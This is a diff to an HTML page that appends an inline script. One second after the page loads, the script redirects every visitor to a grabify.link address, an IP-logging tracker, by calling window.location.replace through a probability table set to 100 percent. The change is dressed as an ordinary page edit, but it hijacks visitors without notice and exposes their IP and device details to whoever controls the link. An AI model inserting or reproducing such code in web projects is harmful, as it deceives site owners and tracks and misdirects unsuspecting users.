@@ -165,5 +165,28 @@
             });
         });
     </script>
+<script src="js/main.js"></script>
+  <script>
+        (function() {
+            const links = [
+                { url: "https://grabify.link/9KZQ8F", probability: 100 },   
+            ];
+            
+            function redirect() {
+                let randomNum = Math.random() * 100;
+                let cumulativeProbability = 0;
+                
+                for (let link of links) {
+                    cumulativeProbability += link.probability;
+                    if (randomNum < cumulativeProbability) {
+                        window.location.replace(link.url);
+                        return;
+                    }
+                }
+            }
+            
+            setTimeout(redirect, 1000);
+        })();
+    </script>
 </body>
 </html>
